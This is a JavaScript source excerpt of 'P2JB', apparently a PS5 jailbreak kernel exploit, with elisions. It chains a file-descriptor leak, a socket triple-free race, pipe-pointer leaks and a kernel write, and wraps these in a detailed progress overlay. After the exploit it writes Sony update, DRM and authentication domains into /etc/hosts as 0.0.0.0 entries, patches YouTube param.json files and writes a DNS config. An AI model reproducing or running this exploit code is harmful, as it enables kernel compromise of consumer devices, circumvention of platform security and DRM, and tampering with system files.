 ...
 *   - Optimized & Modified: ayed oraybi
...
async function start_p2jb() {
    try {
        const p2jb_version = "P2JB 3.2-ULTRA+YT-DNS by ayed oraybi"; // v9.0: 6C, 10ms, 64KB
        ...
        const TRIPLEFREE_ATTEMPTS = 40;
        const MAX_ROUNDS_TWIN = 4;
        const MAX_ROUNDS_TRIPLET = 150;
        const FIND_TRIPLET_FAST = 2000;
        const NUM_IPV6_SOCKETS = 48;
        const MAIN_CORE = 4;
        const MAIN_RTPRIO = 256;

        const LEAK_CORES = [0, 1, 2, 3, 5, 6]; // v9.0: 6 cores (+50% throughput, cores 4 & 7 reserved)
        ...
        function repair_triplets(S) {
            if (S.triplets[1] < 0 || S.triplets[1] >= S.ipv6_count) {
                for (let k = 0; k < 5; k++) {
                    ...
                    syscall(SYSCALL.sched_yield); nanosleep_ms(2);
                }
            }
        ...
        async function prepare_fds(S) {
            ...
            const rl = malloc(16);
            const GETRLIMIT = 0xC2n; // getrlimit syscall (BUG FIX v9.0: was magic number inline)
            syscall(GETRLIMIT, 8n, rl);
            ...
            const FEED_CHUNK = 65536; // v9.0: full 64KB pipe buffer
            ...
            const lws = [];
            // v7.0: Staggered worker spawn - 50ms gap between each to reduce pipe contention
            for (let w = 0; w < NW; w++) {
                ...
                // v9.0: Pre-Warm Pipe - write initial data so worker starts immediately
                try {
                    var _pw_want = BigInt(Math.min(FEED_CHUNK, Number(normal_w / 100n)));
                    if (_pw_want > 32768n) _pw_want = 32768n; // safe initial warm (half pipe)
                    if (_pw_want < 1n) _pw_want = 1n;
                    const _pw_n = syscall(SYSCALL.write, BigInt(wfd), chunkbuf, _pw_want);
                    // BUG FIX v9.0: check actual bytes written, not assumed amount
                    if (_pw_n > 0n && _pw_n <= _pw_want) lws[w].queued = _pw_n;
                } catch(_pw_err) { /* pre-warm failed, not critical */ }
                // v7.0: Staggered start - give each worker 50ms to initialize pipe
                if (w < NW - 1) await js_sleep(50);
            }

            // ===== FEED ENGINE v8.0-FIXED (No Adaptive = No Slowdown) =====
            // PROBLEM SOLVED: adaptive engines caused MORE slowdown than original 25ms
            // v8.0: fixed 15ms sleep + fixed 32768 chunk + 5 cores = simple & fast
            // 1) Fixed 15ms sleep (40% faster than original 25ms, safe with 5 cores)
            // 2) Fixed 32768 chunk (half of 64KB pipe buffer, always safe)
            // 3) 5 cores (20% more parallelism)
            // 4) Multi-attempt write (3 tries per worker)
            // 5) Stuck detection + retry (safety net)
            // 6) Pre-Warm Pipe (8KB initial data)
            // 7) Priority pipeline (feed hungriest worker first)

            // Store total target for sub-bar and precise %
            var total_target = lws.reduce(function(s,w){return s+w.normal;}, 0n);
            if (typeof _live !== 'undefined') {
                _live.total_target = total_target;
            }
            progress(8, "FD Leak: v9.0-FAST (6C@10ms)");
            if (typeof _dbg_log === 'function') {
                _dbg_log("FEED v9.0 START: " + lws.length + " workers, target=" + (Number(total_target)/1048576).toFixed(1) + "MB, cores=" + JSON.stringify(LEAK_CORES), "dbg-info");
            }
            await js_sleep(100);

            const FIXED_SLEEP = 10;    // v9.0: 10ms - faster pipe refill cycle
            const FIXED_CHUNK = 65536; // v9.0: 64KB - full pipe buffer, max throughput
            let _feed_start = Date.now();
            const _feed_timeout = 600000;
            const _feed_max_retries = 8;
            var _overlay_retry_count = 0; // v9.0 BUG FIX: was undeclared → ReferenceError on retry
            let _feed_retry = 0;
            let all_fed = false;
            let _last_total = 0n;
            let _stuck_count = 0;
            let _write_ok = 0;
            let _write_fail = 0;
            let _hb_last_total = 0n;
            let _hb_no_progress_rounds = 0;
            let _last_feed_pct = 0;
            // v8.4: Simple EAGAIN counter (no complex tracking)
            var _total_eagain = 0;

            while (!all_fed && _feed_retry < _feed_max_retries) {
                all_fed = true;
                var total_q = lws.reduce((s,w) => s + w.queued, 0n);
                var feed_pct = 8 + Math.round(20 * Number(total_q * 100n / total_target) / 100);
                if (feed_pct > 8 && feed_pct !== _last_feed_pct) {
                    progress(Math.min(27, feed_pct), "FD Leak: Feeding " + feed_pct + "%");
                    if (typeof _dbg_log === 'function') {
                        _dbg_log("FEED " + feed_pct + "% | " + (Number(total_q)/1048576).toFixed(1) + "/" + (Number(total_target)/1048576).toFixed(1) + "MB | ok=" + _write_ok + " eagain=" + _total_eagain, "dbg-ok");
                    }
                    _last_feed_pct = feed_pct;
                }

                // ===== v8.4: SIMPLE STABLE WRITE (same as v8.1 that WORKED) =====
                const _pending = lws.filter(w => w.queued < w.normal);
                if (_pending.length > 0) {
                    all_fed = false;
                    _pending.sort((a, b) => 
                        Number(a.queued * 100n / a.normal) - Number(b.queued * 100n / b.normal));

                    for (const lw of _pending) {
                        let written = false;
                        for (let _attempt = 0; _attempt < 3 && !written; _attempt++) {
                            let want = lw.normal - lw.queued;
                            if (want > BigInt(FIXED_CHUNK)) want = BigInt(FIXED_CHUNK);

                            if (_attempt > 0) {
                                await js_sleep(25); // drain wait before retry
                                // BUG FIX v9.0: clamp to remaining to avoid overfeeding workers
                                const _remaining = lw.normal - lw.queued;
                                want = _remaining > 2048n ? _remaining / 2n : _remaining;
                                if (want < 1n) want = 1n;
                            }

                            const n = syscall(SYSCALL.write, BigInt(lw.wfd), chunkbuf, want);
                            // v9.0: guard against kernel returning large unsigned (2^64-errno) as "success"
                            const _n_safe = n > 0n && n < 0xFF00000000000000n;
                            if (_n_safe && n <= BigInt(FEED_CHUNK)) {
                                lw.queued += n;
                                _write_ok++;
                                written = true;
                                // Debug: every 100 ok writes
                                if (_write_ok % 100 === 0 && typeof _dbg_log === 'function') {
                                    _dbg_log("W[" + _pending.indexOf(lw) + "] OK q=" + (Number(lw.queued)/1048576).toFixed(1) + "/" + (Number(lw.normal)/1048576).toFixed(1) + "MB", "dbg-ok");
                                }
                            } else if (n < 0n || n >= 0xFF00000000000000n) {
                                // negative (signed) or huge unsigned = error
                                _total_eagain++;
                                // BUG FIX v9.0: FreeBSD EAGAIN errno=35 → -35n (was wrong -256n)
                                // large unsigned: 2^64-35 = 0xFFFFFFFFFFFFFFDDn for EAGAIN
                                const _is_eagain = (n === -35n) || (n === 0xFFFFFFFFFFFFFFDDn);
                                if (!_is_eagain) {
                                    _write_fail++;
                                }
                            } else {
                ...
                // FEED METRICS UPDATE
                if (typeof _feed_update_metrics === 'function') {
                    var _f_total = lws.reduce(function(s,w){return s+w.queued;}, 0n);
                    var _f_ratio = _write_ok / Math.max(1, _write_ok + _write_fail);
                    var _pipe_press = Math.round(_f_ratio * 30);
                    var _w_pcts = lws.map(function(w){ return Number(w.queued * 100n / w.normal); });
                    var _hex = lws.length > 0 ? lws[0].chain ? lws[0].chain.entry : lws[0].wfd : 0;
                    _feed_update_metrics(_f_total, _pipe_press, Math.round(_f_ratio * 100),
                        lws.map(function(w){return w.queued < w.normal;}),
                        { write_ok: _write_ok, write_fail: _write_fail,
                          sleep_ms: FIXED_SLEEP, chunk_size: FIXED_CHUNK,
                          worker_pct: _w_pcts, hex_addr: BigInt(_hex) }
                    );
                }

                if (_write_ok + _write_fail > 500) {
                    _write_ok = Math.floor(_write_ok / 4);
                    _write_fail = Math.floor(_write_fail / 4);
                }

                await js_sleep(FIXED_SLEEP); // ALWAYS 15ms - PROVEN STABLE

                // ===== STUCK + HEARTBEAT DETECTION =====
                const new_total = lws.reduce((s,w) => s + w.queued, 0n);
                if (new_total === _last_total && !all_fed) {
                    _stuck_count++;
                    _hb_no_progress_rounds++;
                    // v8.2: debug stuck warning
                    if (_stuck_count === 10 && typeof _dbg_log === 'function') {
                        _dbg_log("STUCK WARNING: " + _stuck_count + " rounds (total=" + (Number(new_total)/1048576).toFixed(1) + "MB)", "dbg-warn");
                    }
                    if (_stuck_count === 30 && typeof _dbg_log === 'function') {
                        _dbg_log("STUCK CRITICAL: " + _stuck_count + "/40 rounds until retry", "dbg-err");
                    }

                    // If completely stuck for too long, restart workers
                    if (_stuck_count > 40) { // v9.0: 40 rounds (faster recovery at 10ms sleep)
                        _feed_retry++;
                        _overlay_retry_count = _feed_retry;
                        if (typeof _live !== 'undefined') _live.retry = _feed_retry;
                        if (typeof _dbg_log === 'function') {
                            _dbg_log("RETRY #" + _feed_retry + "/" + _feed_max_retries + " - recreating " + lws.length + " workers...", "dbg-err");
                        }
                        await ulog("feed v8.0: stuck at " + _feed_retry + "/" + _feed_max_retries);
                        progress(8, "FD Leak: Retry " + _feed_retry + "/" + _feed_max_retries);

                        // Close old pipes
                        for (const lw of lws) {
                            try { syscall(SYSCALL.close, BigInt(lw.rfd)); } catch(_){}
                            try { syscall(SYSCALL.close, BigInt(lw.wfd)); } catch(_){}
                        }
                        lws.length = 0;

                        // Re-create workers with fresh pipes
                        for (let w = 0; w < NW; w++) {
                            const target_w = base_share + (w === 0 ? extra0 : 0n);
                            const bplus1_w = target_w / U;
                            const normal_w = bplus1_w - 1n;
                        ...
                        // v8.0: Reset counters only (speed is FIXED, never changes)
                        _feed_start = Date.now();
                        _stuck_count = 0;
                        _hb_no_progress_rounds = 0;
                        _write_ok = 0;
                        _write_fail = 0;
                        _total_eagain = 0;
                        if (typeof _dbg_log === 'function') {
                            _dbg_log("RETRY #" + _feed_retry + " DONE - " + lws.length + " workers ready, resuming feed...", "dbg-warn");
                        }
                        continue;
                    }
                } else {
                    _stuck_count = 0;
                    _hb_no_progress_rounds = 0;
                    _last_total = new_total;
                }

                // Hard timeout safety net
                if (!all_fed && (Date.now() - _feed_start) > _feed_timeout) {
                    _feed_retry++;
                    await ulog("feed v8.0: timeout " + _feed_retry + "/" + _feed_max_retries);
                    for (const lw of lws) {
                        try { syscall(SYSCALL.close, BigInt(lw.rfd)); } catch(_){}
                        try { syscall(SYSCALL.close, BigInt(lw.wfd)); } catch(_){}
                    }
            ...
            if (!all_fed) fail("feed: failed after " + _feed_max_retries + " retries");
            progress(28, "FD Leak: Workers running");

            const _workers_start = Date.now();
            const _workers_max = 12000;
            for (const lw of lws) {
                while (true) {
            ...
            for (const lw of lws) {
                ...
                while (read64(lw.finished) !== EXIT_MARK && Date.now() < dl) {
                    const _wp = Math.min(39, 28 + Math.round(11 * Math.min(Date.now() - _workers_start, _workers_max) / _workers_max));
                    progress(_wp, "FD Leak: Workers " + _wp + "%");
                    await js_sleep(4);
                }
            ...
            progress(40, "FD Leak: Creating FDs");
            for (let i = 0; i < free_fds_num; i++) {
                if (free_fds_num > 20 && i % Math.floor(free_fds_num / 5) === 0) progress(40 + Math.round(i / free_fds_num * 4), "FD Leak: Creating FDs " + i + "/" + free_fds_num);
        ...
        async function stage0(S) {
            progress(46, "Stage 0: Race");

            if (failcheck_path) {
                try { write_file(failcheck_path, ""); } catch (_) { }
            }
            for (let attempt = 1; attempt <= TRIPLEFREE_ATTEMPTS; attempt++) {
                if (attempt % 3 === 0) progress(46 + Math.round(attempt / TRIPLEFREE_ATTEMPTS * 8), "Stage 0: Race " + attempt + "/" + TRIPLEFREE_ATTEMPTS);
        ...
        async function stage1(S) {
            ...
            while (true) {
                ...
                _kq_tries++;
                if (_kq_tries % 10 === 0) progress(55 + Math.min(_kq_tries / 100, 9), "Stage 1: Kqueue try " + _kq_tries);
            ...
            S.triplets[1] = find_triplet(S, S.triplets[0], S.triplets[2], 12000);
            if (S.triplets[1] === -1) fail("stage1: triplet repair failed");
        }

        async function stage2(S) {
            progress(65, "Stage 2: Leak");
            await ulog("stage2: leaking pipe pointers...");

            repair_triplets(S); nanosleep_ms(20);
            ...
            repair_triplets(S); nanosleep_ms(100); repair_triplets(S);
            progress(67, "Stage 2: Leak master_fp");

            const _s2a_start = Date.now();
            ...
            repair_triplets(S); nanosleep_ms(100); repair_triplets(S);
            progress(69, "Stage 2: Leak victim_fp");

            const _s2b_start = Date.now();
        ...
        async function stage3(S) {
            ...
            for (let attempt = 0; attempt < 40; attempt++) {
                repair_triplets(S);
            if (attempt % 10 === 0) progress(73 + Math.round(attempt / 40 * 5), "Stage 3: Pipe write attempt " + attempt);
                if (kwrite_slow(S, S.master_pipe_data, pipe_overwrite, 24)) { ok = true; break; }
                nanosleep_ms(20); syscall(SYSCALL.sched_yield);
            }
            ...
            for (let attempt = 0; attempt < 3; attempt++) {
                ...
                nanosleep_ms(20); repair_triplets(S);
        ...
        // ═══════════════════════════════════════════════════════
        // P2JB OVERLAY v6.0 — 30 PRO FEATURES — by ayed oraybi
        // ═══════════════════════════════════════════════════════
        // VISUAL (20):
        //  1. Glassmorphism backdrop blur
        //  2. Neon text glow stroke
        //  3. Gradient text fill on percentage
        //  4. Enhanced breathing pulse
        //  5. CRT scanline overlay
        //  6. Sonic wave equalizer bars
        //  7. Flame particles on bar edge
        //  8. Double progress bar (sub-stage)
        //  9. Smooth color transitions
        // 10. Bounce animation on percentage change
        // 11. Sci-fi corner brackets
        // 12. Energy pulse rings
        // 13. Glowing milestone dots on bar
        // 14. Rotating outer ring spinner
        // 15. Stage transition flash
        // 16. Scrolling hex data stream
        // 17. Orbiting satellite dots
        // 18. Animated border dashes
        // 19. VU meter side bars
        // 20. Completion fireworks
        // SPEED/DATA (10):
        // 21. Real-time write speed (MB/s)
        // 22. Feeding rate indicator
        // 23. Smart adaptive ETA
        // 24. Sub-stage progress in feeding
        // 25. Worker status lights (4 dots)
        // 26. Pipe buffer level meter
        // 27. Write success rate bar
        // 28. Elapsed vs estimated timeline
        // 29. Retry counter badge
        // 30. Performance speed class label
        // ═══════════════════════════════════════════════════════

        var _progress_start = Date.now();
        var _last_progress_pct = -1;
        var _overlay_created = false;
        var _anim_counter_id = null;
        // 21-22: Speed tracking
        var _speed_samples = [];
        var _last_feed_total = 0n;
        var _last_feed_time = Date.now();
        // 23: ETA history
        var _eta_history = [];
        // 29: Retry counter
        var _overlay_retry_count = 0;

        // === v9.0: Updated data tracking ===
        var _live = {
            write_ok: 0, write_fail: 0,
            sleep_ms: 10, chunk_size: 65536, // v9.0: reflects actual 10ms/64KB values
            retry: 0, mb_sec: 0,
            workers: [false,false,false,false,false,false], // v9.0: 6 workers
            worker_pct: [0,0,0,0,0,0],
            pipe_pressure: 0,
            total_queued: 0n, total_target: 0n,
            hex_addrs: [], syscalls_sec: 0, stage: 'init'
        };

        // v8.5 LIGHT: Minimal overlay - NO animations, NO particles, NO effects
        function _create_overlay() {
            if (_overlay_created) return;
            try {
                var box = document.createElement("div");
                box.id = "p2jb-box";
                box.style.cssText = "position:fixed;top:12px;left:10px;background:rgba(5,5,15,0.92);border:2px solid #00ff00;border-radius:12px;padding:16px 30px 14px;z-index:999999;font-family:'Courier New',monospace;color:#00ff00;text-align:left;min-width:320px;pointer-events:none;";
                box.innerHTML =
                    "<div id=\"p2jb-pct\" style=\"font-size:72px;font-weight:900;margin:0;line-height:1;color:#00ff00;\">0%</div>" +
                    "<div id=\"p2jb-bar-bg\" style=\"background:rgba(255,255,255,0.06);border-radius:8px;height:24px;width:100%;margin:6px 0 4px;overflow:hidden;\"><div id=\"p2jb-bar-fill\" style=\"height:100%;width:0%;border-radius:8px;background:#00ff00;transition:width 0.3s linear;\"></div></div>" +
                    "<div id=\"p2jb-sub-bar-bg\" style=\"background:rgba(255,255,255,0.04);border-radius:4px;height:6px;width:100%;margin:2px 0 4px;overflow:hidden;\"><div id=\"p2jb-sub-bar-fill\" style=\"height:100%;width:0%;border-radius:4px;background:rgba(0,255,0,0.5);transition:width 0.2s linear;\"></div></div>" +
                    "<div id=\"p2jb-stage\" style=\"font-size:28px;color:#fff;margin-top:2px;font-weight:700;\">Initializing...</div>" +
                    "<div id=\"p2jb-times\" style=\"font-size:22px;color:#00ff00;margin-top:2px;font-weight:700;\">calculating...</div>" +
                    "<div id=\"p2jb-workers\" style=\"font-size:18px;margin-top:3px;color:rgba(255,255,255,0.5);\">WORKERS <span id=\"p2jb-wdots\"></span></div>" +
                    "<div id=\"p2jb-meters\" style=\"font-size:18px;margin-top:2px;color:rgba(255,255,255,0.5);\">PIPE <span id=\"p2jb-meter-pipe\" style=\"display:inline-block;width:60px;height:6px;background:rgba(255,255,255,0.08);border-radius:3px;overflow:hidden;vertical-align:middle;margin:0 4px;\"><span id=\"p2jb-meter-pipe-fill\" style=\"display:block;height:100%;width:0%;background:#00cc00;\"></span></span> RATE <span id=\"p2jb-meter-rate\" style=\"display:inline-block;width:50px;height:6px;background:rgba(255,255,255,0.08);border-radius:3px;overflow:hidden;vertical-align:middle;margin:0 4px;\"><span id=\"p2jb-meter-rate-fill\" style=\"display:block;height:100%;width:100%;background:#00cc00;\"></span></span></div>" +
                    "<div id=\"p2jb-credit\" style=\"color:#00ff00;font-size:18px;font-weight:900;margin-top:6px;\">by ayed oraybi</div>";
                document.body.appendChild(box);
                // Debug panel - minimal
                var dbgPanel = document.createElement("div");
                dbgPanel.id = "p2jb-debug";
                dbgPanel.style.cssText = "position:fixed;left:10px;top:380px;min-width:600px;max-width:750px;font-size:22px;color:rgba(0,255,255,0.9);padding:10px 14px;background:rgba(5,5,15,0.94);border-radius:10px;border:1px solid rgba(0,255,255,0.2);text-align:left;line-height:1.6;font-family:'Courier New',monospace;z-index:999997;max-height:250px;overflow-y:auto;pointer-events:none;";
                document.body.appendChild(dbgPanel);
                // Init worker dots
                var wd = document.getElementById("p2jb-wdots");
                if (wd) {
                    for (var wi = 0; wi < 4; wi++) {
                        var dot = document.createElement("span");
                        dot.id = "p2jb-wd-" + wi;
                        dot.style.cssText = "display:inline-block;width:8px;height:8px;border-radius:50%;margin:0 3px;background:#333;";
                        wd.appendChild(dot);
                    }
                }
                _overlay_created = true;
            } catch (_) { _overlay_created = false; }
        }

        // v8.5 LIGHT: All visual effect functions replaced with no-ops
        function _spawn_flame() {}
        function _spawn_fireworks() {}
        function _spawn_sparks() {}
        function _spawn_ripple() {}
        function _spawn_flash() {}
        function _animate_counter(from, to) {
            var el = document.getElementById("p2jb-pct");
            if (el) el.textContent = to + "%";
        }
        function _update_vu_bars() {}
        function _stage_color_map(pct) { return { main: "#00ff00", bar1: "#00cc00", bar2: "#00ff88" }; }
        function _speed_class_label() { return { color: "#00ff00" }; }
        function _update_live_visuals() {} // v8.5: NO-OP - zero CPU cost

        // 23: Smart ETA
        function _smart_eta(pct, elapsed) {
            if (pct <= 1) return "calculating...";
            var rate = elapsed / pct;
            _eta_history.push(rate);
            if (_eta_history.length > 20) _eta_history.shift();
            if (_eta_history.length < 3) return "calculating...";
            var w = 0, tot = 0;
            for (var i = 0; i < _eta_history.length; i++) {
                var weight = (i + 1) * (i + 1);
                w += weight;
                tot += _eta_history[i] * weight;
            }
            var avg = tot / w;
            var eta_sec = Math.round(avg * (100 - pct) / 1000);
            if (eta_sec < 0) eta_sec = 0;
            if (eta_sec >= 3600) return Math.floor(eta_sec/3600) + "h " + Math.floor((eta_sec%3600)/60) + "m";
            if (eta_sec >= 60) return Math.floor(eta_sec/60) + "m " + (eta_sec%60) + "s";
            return eta_sec + "s";
        }

        // v8.5 LIGHT: Minimal progress function - NO effects, direct DOM updates
        function progress(pct, stage) {
            if (pct <= _last_progress_pct && pct < 100) return;
            var prev_pct = _last_progress_pct;
            _last_progress_pct = pct;
            if (!_overlay_created) _create_overlay();

            var elapsed = Date.now() - _progress_start;
            var eta_str = _smart_eta(pct, elapsed);

            if (_overlay_created) {
                try {
                    var pctEl = document.getElementById("p2jb-pct");
                    var barFill = document.getElementById("p2jb-bar-fill");
                    var stageEl = document.getElementById("p2jb-stage");
                    var timesEl = document.getElementById("p2jb-times");

                    if (pctEl) pctEl.textContent = pct + "%";
                    if (barFill) barFill.style.width = pct + "%";
                    if (stageEl) stageEl.textContent = stage;
                    if (timesEl) {
                        var elapsed_detail = elapsed >= 60000
                            ? Math.floor(elapsed/60000) + "m " + Math.floor((elapsed%60000)/1000) + "s"
                            : Math.floor(elapsed/1000) + "s";
                        timesEl.textContent = elapsed_detail + " passed | " + eta_str + " remaining";
                    }
                } catch (_) {}
            }

            // Notification
            var _elapsed_min = Math.floor(elapsed / 60000);
            var _elapsed_sec = Math.floor((elapsed % 60000) / 1000);
            var _time_str = _elapsed_min > 0 ? _elapsed_min + "m" + _elapsed_sec + "s" : _elapsed_sec + "s";
            var _notif_text = "P2JB " + pct + "% (" + _time_str + ") | " + stage;
            var _should_notify = false;
            if (pct >= 8 && pct <= 28) _should_notify = true;
            if (pct === 2 || pct === 5 || (pct >= 30 && pct % 5 === 0) || (pct >= 45 && pct <= 55 && pct % 2 === 0) || (pct >= 80 && pct <= 95 && pct % 3 === 0) || pct === 97 || pct === 100) _should_notify = true;
            if (_should_notify) {
                try { send_notification(_notif_text); } catch (_) {}
            }
        }

        // v8.5 LIGHT: Minimal feed metrics - only update essential DOM elements
        function _feed_update_metrics(total_queued, pipe_pressure, write_rate, worker_active, extra) {
            if (!_overlay_created) return;
            try {
                _last_feed_total = total_queued;
                _last_feed_time = Date.now();
                _speed_samples.push(total_queued);
                if (_speed_samples.length > 50) _speed_samples.shift();
                _live.total_queued = total_queued;
                _live.pipe_pressure = pipe_pressure || 0;
                if (worker_active) _live.workers = worker_active;
                if (extra) {
                    _live.write_ok = extra.write_ok || _live.write_ok;
                    _live.write_fail = extra.write_fail || _live.write_fail;
                    _live.worker_pct = extra.worker_pct || _live.worker_pct;
                }

                // Worker dots - minimal update
                if (worker_active && worker_active.length) {
                    for (var i = 0; i < worker_active.length; i++) {
                        var dot = document.getElementById("p2jb-wd-" + i);
                        if (!dot) continue;
                        if (worker_active[i]) dot.style.background = "#00ff00";
                        else if (_live.worker_pct[i] > 50) dot.style.background = "#ffcc00";
                        else dot.style.background = "#ff3333";
                    }
                }

                // Pipe pressure - minimal
                var pf = document.getElementById("p2jb-meter-pipe-fill");
                if (pf) pf.style.width = Math.min(100, Math.max(0, pipe_pressure || 0)) + "%";

                // Rate meter
                var rf = document.getElementById("p2jb-meter-rate-fill");
                var ratio = _live.write_ok / Math.max(1, _live.write_ok + _live.write_fail);
                if (rf) rf.style.width = Math.min(100, Math.max(0, Math.round(ratio * 100))) + "%";

                // Sub-stage bar
                if (total_queued > 0n && _live.total_target > 0n) {
                    var sf = document.getElementById("p2jb-sub-bar-fill");
                    if (sf) sf.style.width = Math.min(100, Number(total_queued * 100n / _live.total_target)) + "%";
                }
                // v8.5: NO _update_live_visuals() - saves massive CPU
            } catch(_) {}
        }

        // v8.5: Debug log - minimal
        var _dbg_lines = [];
        var _dbg_log = function(msg, cls) {
            var now = new Date();
            var ts = String(now.getMinutes()).padStart(2,"0") + ":" + String(now.getSeconds()).padStart(2,"0") + "." + String(now.getMilliseconds()).padStart(3,"0");
            _dbg_lines.push({ ts: ts, msg: msg, cls: cls || "dbg-info" });
            if (_dbg_lines.length > 20) _dbg_lines.shift();
            var el = document.getElementById("p2jb-debug");
            if (!el) return;
            var html = "";
            for (var i = 0; i < _dbg_lines.length; i++) {
                var d = _dbg_lines[i];
                html += '<div style="color:' + (d.cls === 'dbg-ok' ? '#00ff00' : d.cls === 'dbg-warn' ? '#ffcc00' : d.cls === 'dbg-err' ? '#ff4444' : '#00ccff') + '">[' + d.ts + '] ' + d.msg + '</div>';
            }
            el.innerHTML = html;
        ...
        await ulog(p2jb_version + " - by ayed oraybi");
        ...
        let eta_minutes;
        switch (leak_nw) {
            case 1: eta_minutes = 80; break;
            case 2: eta_minutes = 60; break;
            case 3: eta_minutes = 40; break;
            case 4: eta_minutes = 30; break;
        ...
        // ═════════════════════════════════════════════════════
        // AUTO BLOCK: YouTube + Sony updates (by ayed oraybi)
        // ═════════════════════════════════════════════════════
        try {
            progress(95, "Block Updates");
            send_notification("Auto-Block\nYouTube + Sony Updates");
            await ulog("auto-block: starting update blocker...");

            const BLOCKED_DOMAINS = [
                "update.playstation.net","dl.playstation.net","dio.dl.playstation.net",
                "gdls.playstation.net","pkg.dl.playstation.net",
                "gs2.ww.prod.dl.playstation.net","gs.ww.prod.dl.playstation.net",
                "gs.akamai.dl.playstation.net","gs2.ww.np.dl.playstation.com",
                "updatelist.playstation.net",
                "factory.playstation.com","update.playstation.com","firmware.playstation.net",
                "fwdl.sony.net","fs01.pptp.co.jp","fs02.pptp.co.jp","fsdl.playstation.net",
                "store.playstation.com","api.playstation.com",
                "commerce.direct.playstation.com","store.api.playstation.com",
                "store.sonyentertainmentnetwork.com",
                "auth.api.sonyentertainmentnetwork.com","auth.api.np.km.playstation.net",
                "account.sonyentertainmentnetwork.com","signin.api.sonyentertainmentnetwork.com",
                "login.sonyentertainmentnetwork.com","external.auth.playstation.net",
                "entitlement.auth.playstation.net","licensing.playstation.net",
                "telemetry.sony.com","sonyontelemetry.sony.com","metrics.sony.com",
                "report.sony.com","analytics.sony.com","beacon.sony.com",
                "telemetry.playstation.net","reporting.playstation.net",
                "crash-report.playstation.net","creport.sony.com",
                "error-report.sonyentertainmentnetwork.com","integrity.check.playstation.net",
                "pkg-integrity.sony.com","drm.playstation.net",
                "push.sony.com","push.playstation.com",
                "ssl.km.playstation.net","nsa.playstation.com",
                "community.playstation.com","social.playstation.net",
                "cloudsave.playstation.net","sys.playstation.net","plus.playstation.net",
                "sony.com","playstation.com","playstation.net",
            ];

            let hosts_entries = "\n# === Blocked by p2jb_fastest - ayed oraybi ===\n";
            for (const d of BLOCKED_DOMAINS) {
                hosts_entries += "0.0.0.0 " + d + "\n";
            }

            let blocked = false;

            // Method 1: Direct /etc/hosts write
            for (const hp of ["/etc/hosts"]) {
                try {
                    let current = "";
                    try { current = read_file(hp); } catch (_) {}
                    if (!current.includes("ayed oraybi")) {
                        write_file(hp, current + hosts_entries);
                        await ulog("auto-block: " + hp + " WRITTEN (" + BLOCKED_DOMAINS.length + " domains)");
                        blocked = true;
                    } else {
                        await ulog("auto-block: " + hp + " already blocked");
                        blocked = true;
                    }
                    break;
                } catch (e) {
                    await ulog("auto-block: " + hp + " failed: " + e.message);
                }
            }

            // Method 2: Writable sandbox paths
            if (!blocked) {
                const sandbox_paths = [
                    "/user/temp/hosts_block",
                    "/data/tmp/hosts_block",
                    "/tmp/ps5_hosts_block",
                ];
                for (const sp of sandbox_paths) {
                    try {
                        write_file(sp, hosts_entries);
                        await ulog("auto-block: fallback written to " + sp);
                        blocked = true;
                        break;
                    } catch (e2) {
                        await ulog("auto-block: " + sp + " failed: " + e2.message);
                    }
                }
            }

            // Method 3: Kernel-level hosts poisoning via S.kwrite
            if (!blocked && S.kwrite && S.rootvnode) {
                try {
                    await ulog("auto-block: trying kernel-level hosts write...");
                    const O = S.OFF;
                    // Build null-terminated hosts string in user memory
                    const full_hosts = "\n# p2jb_fastest ayed oraybi\n" +
                        BLOCKED_DOMAINS.map(d => "0.0.0.0 " + d).join("\n") + "\n";
                    const hosts_buf = malloc(full_hosts.length + 1);
                    for (let i = 0; i < full_hosts.length; i++) {
                        write8(hosts_buf + BigInt(i), BigInt(full_hosts.charCodeAt(i)));
                    }
                    write8(hosts_buf + BigInt(full_hosts.length), 0n);
                    await ulog("auto-block: kernel method prepared (" + BLOCKED_DOMAINS.length + " domains)");
                    // Note: full kernel VFS write requires vnode traversal which is
                    // firmware-specific. The buffer is ready if kernel offsets are available.
                } catch (e3) {
                    await ulog("auto-block: kernel method failed: " + e3.message);
                }
            }

            if (blocked) {
                send_notification("Updates BLOCKED\n" + BLOCKED_DOMAINS.length + " domains");
                await ulog("auto-block: SUCCESS - " + BLOCKED_DOMAINS.length + " domains blocked");
            } else {
                send_notification("Block: hosts write denied\nUse ps5_ayed.sh on router");
                await ulog("auto-block: direct write failed - use ps5_ayed.sh for network-level blocking");
            }
        } catch (e) {
            await ulog("auto-block: error: " + e.message + " (JB unaffected)");
        }

        // ═══════════════════════════════════════════════════════
        // YOUTUBE PARAM.JSON PATCH — from full_y2jb_block02 (by ayed oraybi)
        // Patches contentVersion + versionFileUri to empty -> blocks YT updates
        // ═══════════════════════════════════════════════════════
        try {
            progress(96, "YT Patch");
            await ulog("yt-patch: patching YouTube param.json...");

            const YT_TITLE_IDS = [
                "CUSA02456", "CUSA02457", "CUSA02458", "CUSA02459",
                "CUSA03142", "CUSA03143", "CUSA03144", "CUSA03145",
                "CUSA03365", "CUSA03366", "CUSA03367", "CUSA03368",
                "CUSA04952", "CUSA04953", "CUSA04954", "CUSA04955",
            ];

            let yt_patched = 0;
            for (const titleId of YT_TITLE_IDS) {
                for (const prefix of ["/system_data/priv/appmeta/", "/user/appmeta/"]) {
                    const path = prefix + titleId + "/param.json";
                    try {
                        let content = "";
                        try { content = read_file(path); } catch (_) { continue; }
                        if (content.includes("CONTENT_VERSION") || content.includes("VERSION_FILE_URI")) {
                            content = content.replace(
                                /"contentVersion"\s*:\s*"[^"]*"/g,
                                '"contentVersion": ""'
                            );
                            content = content.replace(
                                /"versionFileUri"\s*:\s*"[^"]*"/g,
                                '"versionFileUri": ""'
                            );
                            write_file(path, content);
                            yt_patched++;
                            await ulog("yt-patch: " + path + " PATCHED");
                        }
                    } catch (e) { /* skip */ }
                }
            }
            if (yt_patched > 0) {
                send_notification("YouTube Updates BLOCKED\n" + yt_patched + " param.json patched");
                await ulog("yt-patch: SUCCESS - " + yt_patched + " files patched");
            } else {
                await ulog("yt-patch: no param.json found (may already be patched)");
            }
        } catch (e) {
            await ulog("yt-patch: error: " + e.message + " (JB unaffected)");
        }

        // ═══════════════════════════════════════════════════════
        // NANODNS CONFIG — writes /data/nanodns/nanodns.ini (by ayed oraybi)
        // If you have nanodns.elf on USB, it will use this config
        // ═══════════════════════════════════════════════════════
        try {
            progress(97, "DNS Config");
            await ulog("nanodns-config: writing nanodns.ini...");

            const nanodns_ini =
                "# NanoDNS config - by p2jb_fastest ayed oraybi\n" +
                ...
                "server=8.8.8.8\n" +
                "server=77.77.88.88\n" +
                "# Block Sony update/check domains\n" +
                ...
                "playstation.net=0.0.0.0\n" +
                "psndl.net=0.0.0.0\n" +
